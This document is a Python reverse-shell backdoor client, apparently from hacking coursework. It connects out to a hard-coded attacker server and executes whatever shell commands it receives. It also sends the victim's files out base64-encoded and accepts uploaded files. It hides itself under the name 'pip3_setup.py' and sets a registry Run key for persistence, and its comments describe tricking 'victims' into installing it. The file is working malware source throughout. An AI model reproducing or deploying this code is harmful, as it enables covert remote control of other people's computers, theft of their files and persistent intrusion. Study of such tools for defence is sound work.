##!/usr/bin/python
import socket
import subprocess
# To allow sanctioning of json => bytes data
import json
# To allow pausing of our program
import time
# To allow manipulation of Registry keys
import os
import shutil
import sys
# To allow sending files from this Backdoor Client to Backdoor Server
import base64

# Global variables
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# In reality, you'll need to code a VPN client for your
# victims to connect to your cloud network as if your
# victims are in the same network of your Backdoor Server

# Then, send your victims the bundle of VPN+Backdoor Clients
# When your victims click the link, they're instantly 
# connected to your Cloud Backdoor Server
# Then, this Backdoor client is connected as if locally to
# your Cloud Backdoor Server ;)

# Thus, the IP_ADDRESS in both server.py & reverse_shell.py
# shall be the localhost IP address 
# of your Cloud Backdoor Server ;)
    
# If you insist performing the captioned procedure, then
# you'll be crossing the boundary of Ethical Hacking ;)
# FBI is watching you :D
IP_ADDRESS = '192.168.2.16'
#IP_ADDRESS = '127.0.0.1'
# Your Cloud Backdoor Server should be running server.py all the time
port = 54321

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    sock.send(json_data.encode())

def reliable_recv():
    # Preparing to store json_data as bytes
    # Theory reference 
    # IP Fragmentation illustration
    # https://users.cs.fiu.edu/~esj/cgs4285/class11.html#:~:text=1.,on%20a%208%20byte%20boundary.
    # Why IP fragmentation HEADER must be 8 bytes
    # while the 2nd portion of it need NOT be 8 bytes
    # https://stackoverflow.com/questions/7846442/why-the-ip-fragments-must-be-in-multiples-of-8-bytes
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            #json_data += sock.recv(1024)
            json_data += sock.recv(4096)
            # If target.recv <= 1024 bytes
            decoded_json = json.loads(json_data.decode())
            #return json.loads(json_data.decode())
            # type(decoded_json) = str
            return decoded_json
            
        except ValueError as e:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            # ******
            continue
            # ******
            #reliable_recv()

# Attempt to force a re-connection every 20 seconds
# Listen to mouse movement double-clicks to re-connect
def connection():
    while True:
        # Our Backdoor will sleep for 5 seconds
        # then it will perform next operation
        time.sleep(5)
        try:
            # Connecting to Backdoor Server
            sock.connect((IP_ADDRESS, port))
            # Enter our Shell
            shell()
        except Exception as e:
            # Recursion to perform recursive connections
            # A func calling itself as a func :D
            #
            # This will make victims actively connect to our Backdoor server
            # Even the attacker does NOT setup the server 
            # As soon as the Backdoor server is setup,
            # the victims will connect to Backdoor Server proactively
            connection()
            
def shell():
    while True:
        #command = sock.recv(1024)
        command = reliable_recv()
        #print(command.decode())

        #if message.decode() == 'q':
        if command.strip() == 'q':
            break
            # continue to sock.close()
        
        # 'cd' command
        # The cd command first 2 CHAR = cd
        # If we wanna cd to somewhere else, command.length must > 1
        elif command[:2].strip() == 'cd' and len(command.strip()) > 1:
            try:
                # After the first 3 CHAR = PATH
                os.chdir(command[3:])
            except:
                continue
            
            # server.py needs this code as well
            
            # except Exception as e:
            #     cd_error = f'[!!] Cannot cd to this PATH: {str(e)}'
            #     continue
            
        #=================================================
        # 'download' command
        # For Downloading files from Backdoor Client => Backdoor Server
        # filePath starts from 9th CHAR 'download '
        # read binary data from files       
            # Start reading from first 9 CHAR as fileName
            # Encode file with ascii before sending
            
        elif command[:8].strip() == 'download':
            file_path = command[9:].strip()
            if os.path.exists(file_path):
                #with open(command[9:].strip(), 'rb') as file:
                with open(file_path, 'rb') as file:
                    # type(file) = _io.BufferedReader
                    file_read = file.read()
                    # type(file_read) = byte
                    file_b64encode = base64.b64encode(file_read)
                    # type(file_b64encode) = byte
                    reliable_send(file_b64encode)
        #=================================================
        
        #=================================================
        # 'upload' command
        elif command[:6].strip() == 'upload':
            #with open(command[7:].strip(), 'wb') as fin:
            with open(command[7:], 'wb') as fin:
                result = reliable_recv()
                result_b64decode = base64.b64decode(result)
                fin.write(result_b64decode)
        #=================================================
                
        else:
            try:
                #message_back = input(f'Type Message to send to Server: ')
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                #sock.send(result)
                reliable_send(result.decode())
                #sock.send(message_back.encode())
            except Exception as e:
                error_message = f'[!!] Cannot Execute this command: {str(e)}'
                reliable_send(error_message)

# We'd like to manipulate the Registry keys first
# C:\Users\USER\AppData\Roaming is hidden
# We'll target this directory for our Reverse Shell
# This will point to whoever user's /AppData
#location = os.environ["appdata"] + "\\pip3.exe"

# ============= Gaining persistency
# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\pip3_setup.exe ;)
location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\pip3_setup.py"

# If 'location' does NOT exist, it's 1st time running this Backdoor client

if not os.path.exists(location):
#     # Performing copying action of our Backdoor.exe to User's /AppData
      shutil.copyfile(sys.executable, location)
#     # Allow users to proactively connect to our backdoor server
#     # whenever they login to their machines
#     #
#     # Appending machine startup .exe permissions to Victims' Windows regkey at
#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#     # /v = Name; /t = Type; /d = Data
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3_setup.py /t REG_SZ /d "' + location + '"', shell=True)
else:
    # Otherwise, just jump to steps below
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # ==========================================
    # port = 54321
    #sock.connect((IP_ADDRESS, port))
    #print(f'Connection Established to Server!')
    #shell()
    # ==========================================
    connection()
    #answer = "Server: Hello Back!"
    #sock.send(answer.encode())
    sock.close()
# ============= Gaining persistency

# sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# connection()
# sock.close()
